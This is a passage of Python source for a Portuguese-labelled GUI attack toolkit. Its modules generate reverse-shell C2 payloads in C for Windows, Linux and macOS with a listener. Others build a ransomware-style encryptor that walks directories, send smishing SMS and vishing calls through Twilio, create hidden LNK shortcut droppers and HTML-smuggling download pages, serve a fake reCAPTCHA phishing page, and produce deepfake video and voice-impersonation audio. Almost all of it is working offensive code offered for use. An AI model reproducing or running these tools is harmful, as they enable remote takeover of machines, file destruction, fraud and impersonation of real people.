            QMessageBox.critical(self, "Erro", f"Erro ao modificar JS:\n{str(e)}")
            return

        try:
            # Atualiza o index.html com localStorage.setItem('os', ...)
            with open(html_path, "r", encoding="utf-8") as f:
                html = f.read()

            if "localStorage.setItem" not in html:
                html = html.replace(
                    '<script src="src/fakerecaptcha.js"></script>',
                    f'<script>localStorage.setItem("os", "{sistema.lower()}");</script>\n<script src="src/fakerecaptcha.js"></script>'
                )
            else:
                html = re.sub(r'localStorage\.setItem\("os", "[^"]*"\);',
                            f'localStorage.setItem("os", "{sistema.lower()}");', html)

            with open(html_path, "w", encoding="utf-8") as f:
                f.write(html)

        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Erro ao modificar HTML:\n{str(e)}")
            return

        # Inicia servidor PHP
        try:
            port = random.randint(8100, 8999)
            subprocess.Popen(
                ["php", "-S", f"0.0.0.0:{port}"],
                cwd=base_path,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            url = f"http://127.0.0.1:{port}/"
            QMessageBox.information(self, "Recaptcha Falso", f"Servidor iniciado em:\n{url}")
            self.phish_url_label.setText(f"<b>Recaptcha Falso:</b> <a href='{url}'>{url}</a>")
            self.phish_url_label.setOpenExternalLinks(True)

        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Erro ao iniciar servidor PHP:\n{str(e)}")


    def generate_deepvoice_audio(self):
        import asyncio
        import threading

        text = self.voice_input.toPlainText().strip()
        voice = self.voice_selector.currentText()

        voice_map = {
            "Obama": "en-US-GuyNeural",
            "Elon Musk": "en-US-AriaNeural",
            "Genérica": "en-US-JennyNeural",
            "Treinada": "en-GB-RyanNeural"
        }
        selected_voice = voice_map.get(voice, "en-US-GuyNeural")

        if not text:
            QMessageBox.warning(self, "Aviso", "Digite um texto para gerar a voz.")
            return

        def run_voice():
            asyncio.run(generate_cloned_voice(text, selected_voice))
            self.deepvoice_status.setText("✅ Voz gerada com sucesso: cloned_voice.mp3")

        threading.Thread(target=run_voice).start()


    def select_face_image(self):
        from PySide2.QtWidgets import QFileDialog
        path, _ = QFileDialog.getOpenFileName(self, "Selecionar Imagem de Rosto", "", "Imagens (*.jpg *.jpeg *.png)")
        if path:
            self.face_image_path = path
            QMessageBox.information(self, "Imagem Selecionada", f"Imagem de rosto carregada:\n{path}")

    def select_target_video(self):
        from PySide2.QtWidgets import QFileDialog
        path, _ = QFileDialog.getOpenFileName(self, "Selecionar Vídeo com Rosto", "", "Vídeos (*.mp4 *.avi *.mov)")
        if path:
            self.target_video_path = path
            QMessageBox.information(self, "Vídeo Selecionado", f"Vídeo alvo carregado:\n{path}")

    def run_deepfake_generator(self):
        import subprocess
        import threading

        if not self.face_image_path or not self.target_video_path:
            QMessageBox.warning(self, "Erro", "Selecione uma imagem de rosto e um vídeo alvo.")
            return

        def execute():
            try:
                output_path = "deepfake_output.mp4"
                command = [
                    "facefusion",
                    "--source", self.face_image_path,
                    "--target", self.target_video_path,
                    "--output", output_path,
                    "--skip-download"  # se já tiver modelos baixados
                ]
                result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

                if result.returncode == 0:
                    self.deepfake_status.setText(f"✅ Deepfake gerado com sucesso: {output_path}")
                else:
                    self.deepfake_status.setText(f"❌ Erro ao gerar deepfake:\n{result.stderr}")

            except Exception as e:
                self.deepfake_status.setText(f"Erro inesperado: {str(e)}")

        threading.Thread(target=execute, daemon=True).start()

    def generate_c2_payload(self):
        ip = self.c2_ip_input.text().strip()
        port = self.c2_port_input.text().strip()
        target_os = self.c2_os_selector.currentText()

        if not ip or not port:
            QMessageBox.warning(self, "Erro", "Preencha IP e Porta corretamente.")
            return

        try:
            os.makedirs("payloads", exist_ok=True)

            if target_os == "Windows":
                filename = "payloads/payload_windows.c"
                exe_name = "payloads/payload_windows.exe"
                payload_code = f'''
    #include <winsock2.h>
    #include <windows.h>
    #pragma comment(lib, "ws2_32")

    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;

    int main() {{
        WSAStartup(MAKEWORD(2,2), &wsa);
        sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        server.sin_family = AF_INET;
        server.sin_port = htons({port});
        server.sin_addr.s_addr = inet_addr("{ip}");
        connect(sock, (struct sockaddr*)&server, sizeof(server));
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        return 0;
    }}'''
                with open(filename, "w") as f:
                    f.write(payload_code)
                compile_cmd = f"x86_64-w64-mingw32-gcc {filename} -o {exe_name} -lws2_32"

            elif target_os == "Linux":
                filename = "payloads/payload_linux.c"
                exe_name = "payloads/payload_linux"
                payload_code = f'''
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <string.h>
    #include <sys/socket.h>

    int main() {{
        int sock;
        struct sockaddr_in attacker;

        sock = socket(AF_INET, SOCK_STREAM, 0);
        attacker.sin_family = AF_INET;
        attacker.sin_port = htons({port});
        attacker.sin_addr.s_addr = inet_addr("{ip}");

        connect(sock, (struct sockaddr *)&attacker, sizeof(attacker));

        dup2(sock, 0); // STDIN
        dup2(sock, 1); // STDOUT
        dup2(sock, 2); // STDERR

        execl("/bin/sh", "sh", NULL);
        return 0;
    }}'''
                with open(filename, "w") as f:
                    f.write(payload_code)
                compile_cmd = f"gcc {filename} -o {exe_name}"

            elif target_os == "macOS":
                filename = "payloads/payload_macos.c"
                exe_name = "payloads/payload_macos"
                payload_code = f'''
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <string.h>
    #include <sys/socket.h>

    int main() {{
        int sock;
        struct sockaddr_in attacker;

        sock = socket(AF_INET, SOCK_STREAM, 0);
        attacker.sin_family = AF_INET;
        attacker.sin_port = htons({port});
        attacker.sin_addr.s_addr = inet_addr("{ip}");

        connect(sock, (struct sockaddr *)&attacker, sizeof(attacker));

        dup2(sock, 0); // STDIN
        dup2(sock, 1); // STDOUT
        dup2(sock, 2); // STDERR

        execl("/bin/zsh", "zsh", NULL);
        return 0;
    }}'''
                with open(filename, "w") as f:
                    f.write(payload_code)
                compile_cmd = f"clang {filename} -o {exe_name}"

            # Compilação
            result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                QMessageBox.information(self, "Sucesso", "Payload gerado com sucesso.")
                
                # ✅ Atualiza comandos padrão conforme plataforma
                selected_platform = self.c2_platform_selector.currentText()
                self.update_default_commands(selected_platform)
                
                # ✅ Inicia o listener
                self.start_listener(ip, int(port))
            else:
                QMessageBox.critical(self, "Erro", f"Erro ao compilar:\n{result.stderr}")

        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Falha ao gerar payload:\n{str(e)}")


    def start_listener(self, ip, port):
        def listener():
            self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener_socket.bind((ip, port))
            self.listener_socket.listen(1)
            self.c2_terminal.append("[+] Aguardando conexão...")
            self.client_socket, addr = self.listener_socket.accept()
            self.c2_terminal.append(f"[+] Conectado com: {addr}\n")
            while True:
                try:
                    output = self.client_socket.recv(4096).decode(errors='ignore')
                    if output:
                        self.c2_terminal.append(output)
                except:
                    break

        threading.Thread(target=listener, daemon=True).start()

    def send_c2_command(self, command):
        if self.client_socket:
            try:
                self.client_socket.sendall((command + "\n").encode())
                self.manual_cmd.clear()
            except Exception as e:
                self.c2_terminal.append(f"[Erro ao enviar comando]: {str(e)}")
        else:
            self.c2_terminal.append("[!] Nenhum cliente conectado ainda.")

    def update_default_commands(self, platform):
        # Remove botões antigos
        for btn in self.cmd_buttons:
            btn.deleteLater()
        self.cmd_buttons.clear()

        if platform == "Windows":
            commands = ["whoami", "ipconfig", "dir", "tasklist", "powershell"]
        elif platform == "Linux":
            commands = ["whoami", "ifconfig", "ls", "ps aux", "uname -a"]
        elif platform == "macOS":
            commands = ["whoami", "ifconfig", "ls", "ps -ax", "sw_vers"]

        for cmd in commands:
            btn = QPushButton(f"Executar: {cmd}")
            btn.clicked.connect(lambda checked=False, c=cmd: self.send_c2_command(c))
            self.cmds_layout.addWidget(btn)
            self.cmd_buttons.append(btn)

    def select_audio_file(self):
        from PySide2.QtWidgets import QFileDialog
        file_path, _ = QFileDialog.getOpenFileName(self, "Selecionar Arquivo de Áudio", "", "Áudio (*.mp3 *.wav)")
        if file_path:
            self.gsm_audio_path.setText(file_path)


    def send_gsm_action(self):
        from twilio.rest import Client
        import os

        sid = self.twilio_sid_input.text().strip()
        token = self.twilio_token_input.text().strip()
        from_number = self.twilio_from_input.text().strip()
        to_number = self.gsm_number_input.text().strip()
        tipo = self.gsm_type_selector.currentText()
        msg = self.gsm_msg_input.toPlainText().strip()
        audio_url = self.gsm_audio_path.text().strip()

        if not sid or not token or not from_number:
            QMessageBox.warning(self, "Erro", "Preencha as credenciais do Twilio (SID, Token e Número From).")
            return

        if not to_number:
            QMessageBox.warning(self, "Erro", "Preencha o número de destino.")
            return

        try:
            client = Client(sid, token)

            if "Smishing" in tipo:
                if not msg:
                    QMessageBox.warning(self, "Erro", "Digite a mensagem SMS.")
                    return

                message = client.messages.create(
                    body=msg,
                    from_=from_number,
                    to=to_number
                )
                self.gsm_status.setText(f"✅ SMS enviado com sucesso! SID: {message.sid}")

            elif "Vishing" in tipo:
                if audio_url.startswith("http"):
                    call = client.calls.create(
                        twiml=f'<Response><Play>{audio_url}</Play></Response>',
                        from_=from_number,
                        to=to_number
                    )
                    self.gsm_status.setText(f"📞 Ligação iniciada com sucesso! SID: {call.sid}")
                else:
                    QMessageBox.warning(self, "Erro", "Insira uma URL de áudio válida para ligação (ex: https://.../audio.mp3)")
                    return

        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Erro ao enviar:\n{str(e)}")

    def generate_apt_chain(self):
        apt = self.apt_selector.currentText()
        chains = {
            "APT29": [
                "Spear Phishing Attachment (T1566.001)",
                "Malicious DOC with Macro",
                "PowerShell Downloader",
                "Command & Control Channel (HTTPS)",
                "Credential Dumping (T1003)"
            ],
            "FIN7": [
                "Spear Phishing Link (T1566.002)",
                "HTA Dropper Executed via wscript",
                "C2 com Empire Framework",
                "Credential Access com mimikatz",
                "Persistence via Registry Run Key"
            ],
            "APT41": [
                "Phishing com PDF",
                "DLL Sideloading",
                "Cobalt Strike Beacon",
                "Lateral Movement via RDP",
                "Exfil via Cloud API"
            ]
        }

        template = chains.get(apt, [])
        if template:
            self.apt_output.setPlainText(" → ".join(template))
            self.apt_status.setText(f"✅ Cadeia de ataque de {apt} gerada.")
        else:
            self.apt_output.clear()
            self.apt_status.setText("❌ Erro: APT não reconhecido.")

    def generate_lnk_malware(self):
        import pythoncom
        from win32com.client import Dispatch

        target = self.lnk_payload_input.text().strip()
        name = self.lnk_name_input.text().strip()
        icon = self.lnk_icon_input.text().strip()
        output = self.lnk_output_dir.text().strip()
        hidden = self.lnk_hidden_checkbox.isChecked()

        if not all([target, name, output]):
            QMessageBox.warning(self, "Erro", "Preencha todos os campos obrigatórios.")
            return

        try:
            shortcut = Dispatch("WScript.Shell").CreateShortcut(os.path.join(output, name))
            shortcut.TargetPath = target
            shortcut.WorkingDirectory = os.path.dirname(target)

            if icon:
                shortcut.IconLocation = icon

            if hidden:
                shortcut.WindowStyle = 7  # Minimizado (invisível)

            shortcut.Save()
            self.lnk_status.setText(f"✅ Atalho criado em: {os.path.join(output, name)}")
        except Exception as e:
            self.lnk_status.setText(f"❌ Erro: {str(e)}")

    def select_icon_file(self):
        from PySide2.QtWidgets import QFileDialog
        file_path, _ = QFileDialog.getOpenFileName(self, "Selecionar Arquivo de Ícone", "", "Ícones (*.ico)")
        if file_path:
            self.lnk_icon_input.setText(file_path)

    def select_output_folder(self):
        from PySide2.QtWidgets import QFileDialog
        folder_path = QFileDialog.getExistingDirectory(self, "Selecionar Pasta de Destino")
        if folder_path:
            self.lnk_output_dir.setText(folder_path)


    def select_htmlsm_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "Selecionar Arquivo para HTML Smuggling", "", "Todos os Arquivos (*)")
        if path:
            self.htmlsm_file_input.setText(path)

    def generate_htmlsm(self):
        import base64
        import os

        file_path = self.htmlsm_file_input.text().strip()
        image_url = self.htmlsm_image_url.text().strip() or "https://i.natgeofe.com/n/548467d8-c5f1-4551-9f58-6817a8d2c45e/NationalGeographic_2572187_square.jpg"
        download_name = self.htmlsm_output_filename.text().strip()
        mode = self.htmlsm_mode_selector.currentText()

        if not os.path.exists(file_path):
            QMessageBox.warning(self, "Erro", "Arquivo selecionado não encontrado.")
            return

        try:
            with open(file_path, "rb") as f:
                b64_data = base64.b64encode(f.read()).decode()

            if mode == "Clique na Imagem":
                html_template = f"""<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Click to Download</title>
        <style>
            body {{ font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }}
            .container {{ text-align: center; }}
            img {{ width: 200px; cursor: pointer; }}
        </style>
    </head>
    <body>
    <div class="container">
        <h3>Click on the Image!</h3>
        <img src="{image_url}" alt="Click to download" onclick="initiateDownload()" />
    </div>
    <script>
    (function() {{
        function b64ToBuf(b64) {{
            var bin = atob(b64), len = bin.length, buf = new Uint8Array(len);
            for (var i = 0; i < len; i++) buf[i] = bin.charCodeAt(i);
            return buf;
        }}
        window.initiateDownload = function() {{
            var data = `{b64_data}`;
            var blobData = b64ToBuf(data);
            var blob = new Blob([blobData], {{ type: 'application/octet-stream' }});
            var link = document.createElement('a');
            link.style.display = 'none';
            document.body.appendChild(link);
            var url = window.URL.createObjectURL(blob);
            link.href = url;
            link.download = '{download_name}';
            link.click();
            setTimeout(function() {{
                window.URL.revokeObjectURL(url);
                document.body.removeChild(link);
            }}, 100);
        }};
    }})();
    </script>
    </body>
    </html>"""
            else:  # Download Automático
                html_template = f"""<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Download Starting...</title>
        <script>
        (function() {{
            function b64ToBuf(b64) {{
                var bin = atob(b64), len = bin.length, buf = new Uint8Array(len);
                for (var i = 0; i < len; i++) buf[i] = bin.charCodeAt(i);
                return buf;
            }}
            window.onload = function() {{
                var data = `{b64_data}`;
                var blobData = b64ToBuf(data);
                var blob = new Blob([blobData], {{ type: 'application/octet-stream' }});
                var link = document.createElement('a');
                link.style.display = 'none';
                document.body.appendChild(link);
                var url = window.URL.createObjectURL(blob);
                link.href = url;
                link.download = '{download_name}';
                link.click();
                setTimeout(function() {{
                    window.URL.revokeObjectURL(url);
                    document.body.removeChild(link);
                }}, 100);
            }};
        }})();
        </script>
    </head>
    <body>
    <h3>Download Iniciando...</h3>
    </body>
    </html>"""

            os.makedirs("outputs", exist_ok=True)
            html_path = os.path.join("outputs", "html_smuggling.html")
            with open(html_path, "w", encoding="utf-8") as f:
                f.write(html_template)

            self.htmlsm_status.setText(f"✅ HTML Smuggling gerado em: {html_path}")
            QMessageBox.information(self, "Sucesso", f"HTML salvo como:\n{html_path}")
            self.htmlsm_open_btn.setEnabled(True)
            self.generated_html_path = html_path

        except Exception as e:
            self.htmlsm_status.setText(f"❌ Erro: {str(e)}")
            QMessageBox.critical(self, "Erro", f"Erro ao gerar HTML:\n{str(e)}")


    def open_htmlsm_in_browser(self):
        import webbrowser
        import os

        if hasattr(self, "generated_html_path") and os.path.exists(self.generated_html_path):
            try:
                webbrowser.open_new_tab(f"file://{os.path.abspath(self.generated_html_path)}")
            except Exception as e:
                QMessageBox.critical(self, "Erro", f"Falha ao abrir no navegador:\n{str(e)}")
        else:
            QMessageBox.warning(self, "Erro", "Arquivo HTML não encontrado para abrir.")



    def generate_sim_ransomware(self):
        import os
        import subprocess
        from PySide2.QtWidgets import QMessageBox

        name = self.ransomware_name_input.text().strip() or "SimRansom"
        key_text = self.ransomware_key_input.text().strip()
        cipher_type = self.ransomware_cipher_selector.currentText()

        if not key_text:
            QMessageBox.warning(self, "Erro", "Digite uma chave (ex: SegredoTop123).")
            return

        key = key_text.encode("utf-8")
        key_len = len(key)
        key_array = ', '.join(str(b) for b in key)

        os.makedirs("sim_ransomware", exist_ok=True)

        encryptor_path = f"sim_ransomware/{name}_encryptor.c"
        decryptor_path = f"sim_ransomware/{name}_decryptor.c"
        exe_path = f"sim_ransomware/{name}.exe"

        if cipher_type == "RC4":
            cipher_func = f"""
    void rc4(unsigned char* data, int len, unsigned char* key, int klen) {{
        unsigned char S[256];
        for (int i = 0; i < 256; i++) S[i] = i;

        int j = 0;
        for (int i = 0; i < 256; i++) {{
            j = (j + S[i] + key[i % klen]) % 256;
            unsigned char tmp = S[i];
            S[i] = S[j];
            S[j] = tmp;
        }}

        int i = 0; j = 0;
        for (int n = 0; n < len; n++) {{
            i = (i + 1) % 256;
            j = (j + S[i]) % 256;
            unsigned char tmp = S[i];
            S[i] = S[j];
            S[j] = tmp;
            data[n] ^= S[(S[i] + S[j]) % 256];
        }}
    }}
    """
            crypto_call = "rc4(buffer, len, key, key_len);"

        else:  # XOR
            cipher_func = f"""
    void xor_cipher(unsigned char* data, int len, unsigned char* key, int klen) {{
        for (int i = 0; i < len; i++) {{
            data[i] ^= key[i % klen];
        }}
    }}
    """
            crypto_call = "xor_cipher(buffer, len, key, key_len);"

        base_code = f'''#define _CRT_SECURE_NO_WARNINGS
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <dirent.h>
    #include <sys/stat.h>

    unsigned char key[] = {{{key_array}}};
    int key_len = {key_len};

    {cipher_func}

    void process_file(const char* filepath) {{
        FILE* f = fopen(filepath, "rb");
        if (!f) return;
        fseek(f, 0, SEEK_END);
        long len = ftell(f);
        rewind(f);

        unsigned char* buffer = malloc(len);
        fread(buffer, 1, len, f);
        fclose(f);

        {crypto_call}

        FILE* out = fopen(filepath, "wb");
        fwrite(buffer, 1, len, out);
        fclose(out);
        free(buffer);
    }}

    void walk(const char* path) {{
        struct dirent* entry;
        DIR* dp = opendir(path);
        if (!dp) return;

        while ((entry = readdir(dp))) {{
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
            char fullpath[1024];
            snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);

            struct stat st;
            stat(fullpath, &st);
            if (S_ISDIR(st.st_mode)) {{
                walk(fullpath);
            }} else {{
                process_file(fullpath);
            }}
        }}
        closedir(dp);
    }}

    int main(int argc, char* argv[]) {{
        if (argc != 2) {{
            printf("Uso: %s <pasta>\\n", argv[0]);
            return 1;
        }}
        walk(argv[1]);
        return 0;
    }}
    '''

        with open(encryptor_path, "w") as f:
            f.write(base_code)

        with open(decryptor_path, "w") as f:
            f.write("// Mesmo código do encryptor (criptografia simétrica)\n")
            f.write(base_code)

        compile_cmd = f"x86_64-w64-mingw32-gcc {encryptor_path} -o {exe_path}"
        try:
            result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                QMessageBox.information(self, "Sucesso", f"✅ Simulador gerado: {exe_path}\n\nCifra: {cipher_type}\nChave usada: {key_text}")
            else:
                QMessageBox.critical(self, "Erro", f"Erro na compilação:\n{result.stderr}")
        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Erro ao compilar:\n{str(e)}")



import asyncio
import edge_tts

async def generate_cloned_voice(text, voice="en-US-GuyNeural", output_file="outputs/cloned_voice.mp3"):
    communicate = edge_tts.Communicate(text, voice)
    await communicate.save(output_file)
    return output_file

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = DarkThemeApp()
    window.show()
    sys.exit(app.exec_())
